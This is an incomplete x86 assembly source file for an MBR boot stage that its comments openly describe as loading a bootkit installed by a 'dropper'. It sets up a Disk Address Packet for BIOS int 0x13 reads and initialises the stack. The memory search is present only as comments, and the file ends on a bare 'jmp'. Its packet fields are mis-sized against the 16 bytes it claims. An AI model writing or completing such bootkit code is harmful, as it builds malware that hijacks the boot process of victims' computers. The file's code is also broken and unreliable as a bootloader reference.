BITS 16                              ; Specify 16-bit mode
ORG 0x7c00                           ; Set the origin address to 0x7c00. This is where the MBR is loaded by the BIOS

;
; https://wiki.osdev.org/Memory_Map_(x86) states that the memory region 0x00000500 - 0x00007BFF is usable memory,
; so we arbitrarily choose 0x2000 as the stack base address.
;
STACK_BASE EQU 0x2000

jmp start                            ; Jump over the "data section" to the "code section"

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;           data section         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;
; Disk Address Packet (DAP) structure. Used to read the bookit sectors from disk via LBA addressing with BIOS int 0x13
; See: https://wiki.osdev.org/Disk_access_using_the_BIOS_(INT_13h)
; Note:
; - The actual values for number of sectors to transfer and the LBA address of the bootkit are filled in by the DROPPER,
;   as they are determined in the bootkit installation process. This value is also used when searching for free memory for
;   the bootloader, where it is used to check for enough memory (free_memory >= number_of_sectors * sector_size)
; - The value for transfer buffer is determined dynamically by the bootloader later in the code (search for free_memory)
;
bootkit_dap: 
    db 0x10                          ; size of packet (16 bytes)
    db 0x00                          ; unused (always 0)
    dw 0x00                          ; number of sectors to transfer
    dq 0x00                          ; transfer buffer (16 bit segment:16 bit offset). Where the bootkit is loaded
    dq 0x00                          ; lower 32-bits of 48-bit starting LBA
    dq 0x00                          ; upper 16-bits of 48-bit starting LBA

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;           code section         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

start:
    ; Initialization (mainly taken from GRUB2 source code)
    cli                              ; Disable interrupts in order to safely initialize registers
    xor ax, ax
    mov ds, ax
    mov ss, ax
    mov sp, STACK_BASE
    sti                              ; Done with initialization, reenable interrupts

;
; Find free memory to load the bootkit (via BIOS int 0x15, eax = 0xE820)
; See: https://wiki.osdev.org/Detecting_Memory_(x86)#BIOS_Function:_INT_0x15.2C_EAX_.3D_0xE820
;

;
; Pass control to the bootkit
;
jmp 